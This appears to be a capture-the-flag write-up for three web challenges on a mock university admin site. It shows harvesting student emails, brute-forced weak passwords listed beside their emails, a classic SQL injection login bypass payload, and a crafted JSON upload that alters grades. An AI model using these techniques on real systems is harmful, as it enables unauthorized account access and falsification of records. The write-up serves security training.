# web

## wpi admin

> Solved by : thewhiteh4t

* email of our friend : alexo@uupeye.edu
* “students” here have some “bad” passwords
* emails of students are visible on : https://wpiadmin.wpictf.xyz/topStudents
* so we get a list of emails which we can bruteforce on student login!

```
    colino@uupeye.edu
    calliep@uupeye.edu
    annar@uupeye.edu
    gaylenek@uupeye.edu
    dennisb@uupeye.edu
    sherrim@uupeye.edu
    adams@uupeye.edu
```

* after bruteforcing we get all these credentials

```
    colino@uupeye.edu:123456
    calliep@uupeye.edu:password
    annar@uupeye.edu:iloveyou
    gaylenek@uupeye.edu:qwerty
    dennisb@uupeye.edu:123123
    sherrim@uupeye.edu:12345678
    adams@uupeye.edu:soccer
```

* after checking each profile we get flag on `dennisb@uupeye.edu`

![](https://imgur.com/a/pt0esJv)

----------

## wpi admin 2

> Solved by : thewhiteh4t

* we login as dennisb@uupeye.edu again
* In student communication we get the link to admin portal : https://wpiadmin.wpictf.xyz/iyghfihGBKHJF9719fn113
* Bruteforcing did not work so I tried SQL login bypass using burpsuite

```
    admin@uupeye.edu' or '1'='1
```

![](https://i.imgur.com/ah9fjqm.png)

* Bypass is successful and we get the link for admin portal!

![](https://i.imgur.com/sUzWapJ.png)

----------

## wpi admin 3

> Solved by : thewhiteh4t

* We now have access to admin panel and we have to change grades of our friend
* challenge states that we need to add grades for 4 semesters
* grades are uploaded using a json file
* on inspecting the page source we can see a link for an example json file

![](https://i.imgur.com/PUyXWbj.png)

* by adding two more semesters and changing `production` to true we can upload grades successfully, here is the json I used :

```json
    {
        "configName": "Example",
        "timezone": "EST",
        "production": true,
        "studentData": [
          {
            "name": "Alexo O",
            "email": "alexo@uupeye.edu",
            "id": 123456,
            "major": "Computer Science",
            "class": 2023,
            "workerStatus": false,
            "grades": [
              {
                "year": 2019,
                "semester": "fall",
                "semesterGPA": 4.00,
                "courses": [
                  {
                    "name": "Calculus 1",
                    "code": "MA1021",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Introduction to Program Design",
                    "code": "CS1101",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Elements of Writing",
                    "code": "WR1010",
                    "points": 3,
                    "grade": "A"
                  }, {
                    "name": "Calculus 2",
                    "code": "MA1022",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Accelerated Object-Oriented Design Concepts",
                    "code": "CS2103",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Writing about Science and Technology",
                    "code": "WR1011",
                    "points": 3,
                    "grade": "A"
                  }
                ]
              },
              {
                "year": 2019,
                "semester": "spring",
                "semesterGPA": 4.00,
                "courses": [
                  {
                    "name": "Calculus 3",
                    "code": "MA1023",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Calculus 4",
                    "code": "MA1024",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Systems Programming Concepts",
                    "code": "CS2303",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Algorithms",
                    "code": "CS2223",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "General Physics-mechanics",
                    "code": "PH1110",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "General Physics-electricity and Magnetism",
                    "code": "PH1120",
                    "points": 3,
                    "grade": "A"
                  }
                ]
              },
              {
                "year": 2020,
                "semester": "spring",
                "semesterGPA": 4.00,
                "courses": [
                  {
                    "name": "Calculus 3",
                    "code": "MA1023",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Calculus 4",
                    "code": "MA1024",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Systems Programming Concepts",
                    "code": "CS2303",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Algorithms",
                    "code": "CS2223",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "General Physics-mechanics",
                    "code": "PH1110",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "General Physics-electricity and Magnetism",
                    "code": "PH1120",
                    "points": 3,
                    "grade": "A"
                  }
                ]
              },
              {
                "year": 2020,
                "semester": "summer",
                "semesterGPA": 4.00,
                "courses": [
                  {
                    "name": "Calculus 3",
                    "code": "MA1023",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Calculus 4",
                    "code": "MA1024",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Systems Programming Concepts",
                    "code": "CS2303",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "Algorithms",
                    "code": "CS2223",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "General Physics-mechanics",
                    "code": "PH1110",
                    "points": 3,
                    "grade": "A"
                  },
                  {
                    "name": "General Physics-electricity and Magnetism",
                    "code": "PH1120",
                    "points": 3,
                    "grade": "A"
                  }
                ]
              }
            ]
          }
        ]
      }
```

* after uploading it we get the flag!

![](https://i.imgur.com/OjwLaH4.png)